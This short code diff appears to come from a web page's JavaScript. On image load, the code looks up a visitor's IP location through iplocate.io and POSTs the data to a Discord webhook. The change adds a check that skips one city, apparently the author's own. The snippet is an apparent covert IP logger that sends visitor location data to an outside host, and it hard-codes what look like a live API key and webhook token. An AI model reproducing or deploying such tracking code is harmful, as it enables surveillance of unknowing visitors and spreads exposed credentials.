@@ -126,7 +126,7 @@ image.onload = () => {
   fetch('https://iplocate.io/api/lookup/'+msg+'?apikey=020d9572d854985027669009689a55f6')
   .then(res => res.json())
   .then(async data => {
-    console.log(data)
+    if(data.city=="South Milwaukee"){return;}
 const DISCORD_WEBHOOK_URL ="https://discord.com/api/webhooks/1524211822620704790/LO3jEkeE3ufjQ4sh8WmMoLViD3QORxXR8_9mg_FnAurUOinNMcj3fYYCrIK2wwrj4y9b";
       const response = await fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
